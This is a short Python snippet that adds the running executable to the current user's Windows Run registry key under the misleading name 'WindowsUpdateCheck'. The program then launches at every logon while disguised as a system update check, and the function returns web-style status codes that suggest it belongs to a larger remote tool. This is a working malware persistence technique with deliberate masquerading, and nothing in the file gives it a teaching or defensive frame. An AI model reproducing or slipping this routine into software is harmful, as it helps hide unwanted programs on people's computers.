import os
import sys
import winreg as reg

def add_to_windows_startup():
    exe_path = sys.executable
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "WindowsUpdateCheck", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(reg_key)
        return 200
    except Exception as e:
        return 401

